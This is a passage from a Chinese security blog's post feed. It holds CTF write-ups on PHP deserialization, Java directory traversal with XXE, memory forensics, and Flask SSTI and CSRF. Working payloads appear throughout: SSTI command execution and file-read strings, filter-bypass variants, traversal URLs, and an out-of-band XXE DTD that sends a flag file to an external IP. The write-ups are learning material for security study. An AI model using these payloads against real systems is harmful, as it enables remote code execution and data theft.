class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__bool__&#x27;</span>, <span class="string">&#x27;__getattr__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__set__&#x27;</span>, <span class="string">&#x27;__delete__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&quot;__instancecheck__&quot;</span>, <span class="string">&#x27;__subclasscheck__&#x27;</span>, <span class="string">&#x27;__len__&#x27;</span>, <span class="string">&#x27;__length_hint__&#x27;</span>, <span class="string">&#x27;__missing__&#x27;</span>,<span class="string">&#x27;__getitem__&#x27;</span>, <span class="string">&#x27;__setitem__&#x27;</span>, <span class="string">&#x27;__iter__&#x27;</span>,<span class="string">&#x27;__delitem__&#x27;</span>, <span class="string">&#x27;__reversed__&#x27;</span>, <span class="string">&#x27;__contains__&#x27;</span>, <span class="string">&#x27;__add__&#x27;</span>, <span class="string">&#x27;__sub__&#x27;</span>,<span class="string">&#x27;__mul__&#x27;</span>]</span><br><span class="line">    neededFunction = [<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    pay = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Payload?[1|0]&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> index, i <span class="keyword">in</span> <span class="built_in">enumerate</span>(&#123;&#125;.__class__.__base__.__subclasses__()):</span><br><span class="line">        <span class="keyword">for</span> attr <span class="keyword">in</span> searchList:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">hasattr</span>(i, attr):</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">eval</span>(<span class="string">&#x27;str(i.&#x27;</span>+attr+<span class="string">&#x27;)[1:9]&#x27;</span>) == <span class="string">&#x27;function&#x27;</span>:</span><br><span class="line">                    <span class="keyword">for</span> goal <span class="keyword">in</span> neededFunction:</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">eval</span>(<span class="string">&#x27;&quot;&#x27;</span>+goal+<span class="string">&#x27;&quot; in i.&#x27;</span>+attr+<span class="string">&#x27;.__globals__[&quot;__builtins__&quot;].keys()&#x27;</span>)):</span><br><span class="line">                            <span class="keyword">if</span> pay != <span class="number">1</span>:</span><br><span class="line">                                <span class="built_in">print</span>(index,i.__name__,<span class="string">&quot;:&quot;</span>, attr, goal)</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                <span class="built_in">print</span>(<span class="string">&quot;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;&quot;</span> + i.__name__ + <span class="string">&quot;&#x27; %&#125;&#123;&#123; c.&quot;</span> + attr + <span class="string">&quot;.__globals__[&#x27;__builtins__&#x27;].&quot;</span> + goal + <span class="string">&quot;(\&quot;[evil]\&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯web-反序列化,java</title>
      <link href="2020/05/15/%E7%BD%91%E9%BC%8E%E6%9D%AFweb-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2020/05/15/%E7%BD%91%E9%BC%8E%E6%9D%AFweb-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>阅读源码后可以发现，这道题过滤的内容比较少，相对简单，但是我一开始还是没做出来，菜。<br>方法一：利用php7.1+特性，对属性类型不敏感，本地构造的时候把protected换成public构造即可。<br>O:11:”FileHandler”:3:{s:2:”op”;i:2;s:8:”filename”;s:8:”flag.php”;s:7:”content”;s:1:”t”;}<br>右键查看源码即可。<br>方法二：在利用php7.1+特性的基础上，利用php伪协议，php://filter/convert.base64-encode/resource=flag.php获取flag.php文件内容。<br>得到内容为PD9waHAgJGZsYWc9J2ZsYWd7YzI0NmJmMzEtOGM3Zi00M2FhLTliY2QtMGY2NDVlNTk2NWQxfSc7Cg==<br>然后base64解码即可。<br>&lt;?php $flag=’flag{c246bf31-8c7f-43aa-9bcd-0f645e5965d1}’;</p><h1 id="java-file"><a href="#java-file" class="headerlink" title="java file"></a>java file</h1><p>这道题拿到手没什么思路，看了师傅们的wp继续做，知道了是目录穿越。<br>首先明白tomcat部署项目的文件结构：<br>部署在webapps文件夹下，其下每个文件夹代表一个项目。</p><img src="http://cdn.polowong.top/static/images/tomcat.jpg"><p>classes文件夹下存放基本类，servlet等文件。<br>首先随便传个文件，发现了servlet的名字。<br>首先要获取web.xml文件，看看文件结构是怎样的，然后再把对应的东西下载下来<br>使用../不断返回上级目录，最后是/web.xml<br>payload:DownloadServlet?filename=../../../web.xml<br>下载下来之后发现了几个servlet文件，对应应该是classes/xxxx.servlet.class（注意前面还有包名）<br>下载servlet.class文件：payload:<br>?filename=../../../classes/cn/abc/servlet/UploadServlet.class<br>这样子把四个servlet下载下来，然后反编译阅读源码</p><img src="http://cdn.polowong.top/static/images/tomcat1.jpg"><p>这是下载的servlet，注意看过滤了flag，不能通过目录穿越直接穿越到根目录下载flag文件。<br>继续看上传servlet，<br>关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;excel-&quot;</span>) &amp;&amp; <span class="string">&quot;xlsx&quot;</span>.equals(fileExtName)) &#123;</span><br><span class="line">                                <span class="keyword">try</span> &#123;</span><br><span class="line">                                    Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                                    Sheet sheet = wb1.getSheetAt(<span class="number">0</span>);</span><br><span class="line">                                    System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                                &#125; <span class="keyword">catch</span> (InvalidFormatException var20) &#123;</span><br><span class="line">                                    System.err.println(<span class="string">&quot;poi-ooxml-3.10 has something wrong&quot;</span>);</span><br><span class="line">                                    var20.printStackTrace();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br></pre></td></tr></table></figure><p>这里可能存在XXE漏洞，遂测试。<br>excel文件需要以excel-开头。<br>由于是在buuoj复现，所以不可以用外网vps，只能用内网vps，用另外一个号再开一个ssh连着。。。卡了俩小时<br>XXE我也不是很了解，后续会继续学习。<br>这里跟着师傅们先复现：<br>大体思路就是xml文件加载外部实体，加载的外部实体里面会”包含”（我是这么理解的）本地flag文件，然后向vps发送一个请求，参数把flag文件带出去。<br>dtd文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;174.1.87.39:8888&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure><p>xml中新添加的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;174.1.87.39&#x2F;1.dtd&quot;&gt;</span><br><span class="line">&lt;data&gt;&amp;send;&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure><p>这里有个坑 就是在Windows系统下不要解压，直接修改后缀然后用360压缩在压缩文件内修改，再把扩展名改回去。<br>改好之后服务器监听端口，上传文件。</p><img src="http://cdn.polowong.top/static/images/tomcat2.jpg"><p>结束。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>XXE不太熟，需要再学习，目录穿越想到了，但是没成功利用，再有就是我看的目录结构看的是java web项目的目录结构，而不是tomcat部署的目录结构，所以也没利用成功。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> buuoj </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-misc</title>
      <link href="2020/05/14/DASCTF-misc/"/>
      <url>2020/05/14/DASCTF-misc/</url>
      
        <content type="html"><![CDATA[<h2 id="DASCTF-MISC-内存取证"><a href="#DASCTF-MISC-内存取证" class="headerlink" title="DASCTF-MISC-内存取证"></a>DASCTF-MISC-内存取证</h2><p>参考链接<br><a href="http://www.fzwjscj.xyz/index.php/archives/25/">http://www.fzwjscj.xyz/index.php/archives/25/</a><br>首先使用volatility 分析操作系统版本，然后过滤文件，将其dump出来。</p><img src="http://cdn.polowong.top/static/images/das1.jpg"><p>这是dump出来的内容<br>通过分析发现在ctf-wiki上是ABC加密，QWE对应着ABC，然后密文是CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA<br>将其解密后结果为veracryptpasswordiskeyboarddraobyek<br>同时提示密码是大写的，所以密码应该是KEYBOARDDRAOBYEK<br>然后使用veracrypt加载secret，输入密码之后有个vhd文件，可以直接右键挂载。<br>但是里面的flag是假的。。用010editor也没看出来什么端倪，参考wp后才知道是NTFS隐写。<br>使用ntfsstreamseditor打开后可以看到隐写的内容flag{4a02f6dc603c377a234df479609d237c}</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>首先是没找到txt文件，其次是不知道加密方式，再到后面是没想到NTFS隐写。。这道题。。自己做是做不出来<br>但是也学习到了NTFS隐写这种操作。<br>参考链接：<a href="https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html">https://www.cnblogs.com/Chesky/p/ALTERNATE_DATA_STREAMS.html</a><br>在NTFS文件系统中存在着NTFS交换数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS交换数据流。<br>简单地说就是可以隐藏文件（图片视频可执行文件）并且正常情况下看不到。<br>可以使用type命令将需要隐藏的文件附加上去。如type “hidden.jpg” &gt; “targe.jpg”:”hidden.jpg”</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flask&amp;ssti&amp;csrf</title>
      <link href="2020/05/14/flask-ssti-csrf/"/>
      <url>2020/05/14/flask-ssti-csrf/</url>
      
        <content type="html"><![CDATA[<h1 id="最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。"><a href="#最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。" class="headerlink" title="最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。"></a>最近”闲的”没事研究了一下flask框架的防护问题，主要是ssti与csrf。</h1><p>10号前一直在搞用flask写的bms，算是荒废掉了。。<br>先说一句废话，七牛CDN有个测试域名，一段时间后失效，失效后需要替换为自己备案后的域名进行CDN加速，在这里出现了一个问题，在hexo主题配置文件将URL换为自己的CDN域名后，用之前的域名上传的图片就找不到了（因为之前的域名已经被废弃，无法解析）<br>这时候可以 hexo clean 然后 hexo g，重新把md文件渲染成html文件，这样里面产生的图片链接的URL前缀就是我们新配置的CDN域名。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw">https://mp.weixin.qq.com/s/Lj4nCz0hag-AKQF_s79fQw</a><br><a href="https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0">https://misakikata.github.io/2020/04/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E4%B8%8ESSTI/#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0</a><br><a href="https://xz.aliyun.com/t/6885">https://xz.aliyun.com/t/6885</a><br><a href="http://shaobaobaoer.cn/archives/660/python-flask-jinja-ssti">http://shaobaobaoer.cn/archives/660/python-flask-jinja-ssti</a><br><a href="https://www.anquanke.com/post/id/188172">https://www.anquanke.com/post/id/188172</a></p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>ssti就是服务器端模板注入（Server Side Template Injection）<br>模板指的是现成写好的东西，只需要传入一些变量到模板，然后渲染成html页面。模板是写好的，而变量是每次需要传入的。<br>不正确地使用模板引擎进行渲染时，会出现SSTI漏洞。（jinja2）<br>在flask中，使用jinja2模板渲染引擎，有两种渲染模板的方法：render_template()和render_template_string()，两种方法的区别是第一种指定一个模板文件(.html)，第二种则规定了需要传入一个字符串，把html代码写到字符串中。<br>出现问题的是第二种渲染方式（我写bms的时候用的是第一种。。本来想写写防御来着，但是根本不存在利用点），当显示方式为直接获取变量时，如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person[<span class="string">&#x27;name&#x27;</span>]=request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">hello ,&#123;&#123;person.name&#125;&#125;</span><br></pre></td></tr></table></figure><p>这样的话传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure><p>的话显示的就是7*7，因为这样会把传入的内容当作字符串进行处理，而非模板语句。<br>如果是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">person[&#39;name&#39;]&#x3D;request.args.get(&#39;name&#39;)</span><br><span class="line">hello ,%s %person[&#39;name&#39;]</span><br></pre></td></tr></table></figure><p>通过字符串格式化的方式传入内容，模板语句会被解释执行。</p><h3 id="SSTI利用"><a href="#SSTI利用" class="headerlink" title="SSTI利用"></a>SSTI利用</h3><p>任何漏洞的目的是实现个人意图，比如getshell，读取文件。<br>对于SSTI的利用，我遇到的主要是通过获得config里面的secret key进行伪造session，模拟管理员登录；或者通过实例化os反弹shell，或者通过file、open对象进行文件读取。<br>__class__获取当前实例的对象，__mro__获得父类链，__subclasses__获得当前类所有的子类，__init__实例化一个类，__globals__获取所有可用的方法与变量。<br>举例：<br>命令执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤与绕过"><a href="#过滤与绕过" class="headerlink" title="过滤与绕过"></a>过滤与绕过</h3><h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><p>request.args是Flask中的一个属性，为返回请求的参数，这里把path当作变量名，将后面的路径传值进来，进而绕过了引号的过滤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125;&#125;&amp;path&#x3D;&#x2F;tmp&#x2F;cmd.py</span><br></pre></td></tr></table></figure><h4 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线"></a>过滤双下划线</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;&#39;&#39;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclasses&#x3D;__subclasses__</span><br></pre></td></tr></table></figure><h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h4><p>首先明白中括号是什么作用：从字典中取值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">globals[&quot;os&quot;]&#x3D;&#x3D;globals.os 所以可以用__getitem__绕过。</span><br></pre></td></tr></table></figure><h4 id="过滤点号"><a href="#过滤点号" class="headerlink" title="过滤点号"></a>过滤点号</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;.__class__等价于&quot;&quot;[&quot;__class__&quot;]</span><br></pre></td></tr></table></figure><h4 id="关键词过滤"><a href="#关键词过滤" class="headerlink" title="关键词过滤"></a>关键词过滤</h4><p>思路是进行拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__getattribute__(&quot;__cla&quot;+&quot;ss__&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="SSTI防御"><a href="#SSTI防御" class="headerlink" title="SSTI防御"></a>SSTI防御</h3><p>首先是尽量不使用render_template_string(),如果用的话，尽量不使用格式化字符串的形式；如果必须使用的话，要建立相对强的过滤规则，尤其是对小括号的过滤，过滤小括号后就很难执行命令了。<br>对于关键词过滤，我的思路是进行预处理，将接收到的字符串中的引号，加号等特殊符号正则匹配去掉后再进行黑名单匹配。</p><h2 id="flask-csrf分析"><a href="#flask-csrf分析" class="headerlink" title="flask csrf分析"></a>flask csrf分析</h2><h3 id="开口就是老csrf了，先分析分析源码"><a href="#开口就是老csrf了，先分析分析源码" class="headerlink" title="开口就是老csrf了，先分析分析源码"></a>开口就是老csrf了，先分析分析源码</h3><p>首先</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CSRFProtect(app)</span><br></pre></td></tr></table></figure><p>，跟进CSRFProtect</p><img src="http://cdn.polowong.top/static/images/csrf1.jpg"><p> 然后有一个app.before_request修饰的方法，说明在请求前执行。<br> 该方法进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.protect()</span><br></pre></td></tr></table></figure><p> 跟进self.protect()<br> 使用方法validate_csrf尝试验证token的正确性，token为self._get_csrf_token</p><img src="http://cdn.polowong.top/static/images/csrf2.jpg"><img src="http://cdn.polowong.top/static/images/csrf3.jpg"><img src="http://cdn.polowong.top/static/images/csrf4.jpg"><img src="http://cdn.polowong.top/static/images/csrf5.jpg"><p>其实对URLSafeTimedSerializer这个我不是太熟悉，我对他的理解是产生一个session，session包括三个字段，base64加密的数据字段，timestamp，签名。<br>然后产生的token就是获取序列化后的session的数据字段的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session[field_name]</span><br></pre></td></tr></table></figure><p>中的数据。</p><h3 id="生命流程"><a href="#生命流程" class="headerlink" title="生命流程"></a>生命流程</h3><p>第一次访问，产生session与token，设置过期时间<br>第二次包括以后的访问在头部或者表单中携带token，访问前进行验证，验证通过则允许访问。除了token外还有请求头，同源策略等验证</p><h3 id="CSRF防护"><a href="#CSRF防护" class="headerlink" title="CSRF防护"></a>CSRF防护</h3><p>就flask的csrf防护方法而言，主要是防止hacker拿到token，主要需要防范xss，比如上述提到的ssti会导致xss。</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSL&amp;TLS</title>
      <link href="2020/05/01/SSL-TLS/"/>
      <url>2020/05/01/SSL-TLS/</url>
      
